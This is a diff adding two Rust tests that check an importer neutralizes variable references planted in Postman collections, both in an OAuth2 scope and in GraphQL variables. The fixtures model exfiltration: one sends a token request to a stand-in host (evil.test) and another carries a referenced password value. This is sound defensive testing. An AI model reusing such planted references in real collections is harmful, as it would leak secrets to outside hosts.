@@ -102,6 +102,74 @@ fn postman_collection_references_are_neutralized() {
     assert_neutralized(&plan_path(&path), "{{base_url}}");
 }
 
+/// An OAuth2 scope is sent to the token (and authorize) URL, so a
+/// reference planted there is neutralized like any other field.
+#[test]
+fn postman_oauth2_scope_references_are_neutralized() {
+    let collection = format!(
+        r#"{{
+  "info": {{"name": "Evil", "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"}},
+  "item": [{{
+    "name": "Leak",
+    "request": {{
+      "method": "GET",
+      "url": "{{{{base_url}}}}/leak",
+      "auth": {{"type": "oauth2", "oauth2": [
+        {{"key": "accessTokenUrl", "value": "https://evil.test/token"}},
+        {{"key": "grant_type", "value": "client_credentials"}},
+        {{"key": "clientId", "value": "x"}},
+        {{"key": "scope", "value": "read {REF}"}}
+      ]}}
+    }}
+  }}]
+}}"#
+    );
+    let (_dir, path) = source(&[("evil.postman_collection.json", &collection)], false);
+    let plan = plan_path(&path);
+    assert_neutralized(&plan, "{{base_url}}");
+    assert!(tree(&plan).contains("scopes"), "{}", tree(&plan));
+}
+
+/// GraphQL variables stay structured (valid JSON) once neutralized, and the
+/// harmless ones are kept.
+#[test]
+fn postman_graphql_variable_references_are_neutralized() {
+    let collection = format!(
+        r#"{{
+  "info": {{"name": "Evil", "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"}},
+  "item": [{{
+    "name": "Leak",
+    "request": {{
+      "method": "POST",
+      "url": "{{{{base_url}}}}/graphql",
+      "body": {{"mode": "graphql", "graphql": {{
+        "query": "query($id: ID!, $pw: String) {{ user(id: $id) {{ name }} }}",
+        "variables": "{{\"id\": \"42\", \"pw\": \"{REF}\"}}"
+      }}}}
+    }}
+  }}]
+}}"#
+    );
+    let (_dir, path) = source(&[("evil.postman_collection.json", &collection)], false);
+    let plan = plan_path(&path);
+    assert_neutralized(&plan, "{{base_url}}");
+    let all = tree(&plan);
+    assert!(!all.contains("# graphql-variables"), "{all}");
+    assert!(
+        all.contains("id: '42'") || all.contains("id: \"42\""),
+        "{all}"
+    );
+    assert!(
+        !plan
+            .report
+            .notes
+            .iter()
+            .any(|n| n.message.contains("not a flat JSON object")),
+        "{:?}",
+        plan.report.notes
+    );
+}
+
 #[test]
 fn postman_environment_references_are_neutralized() {
     let env = format!(
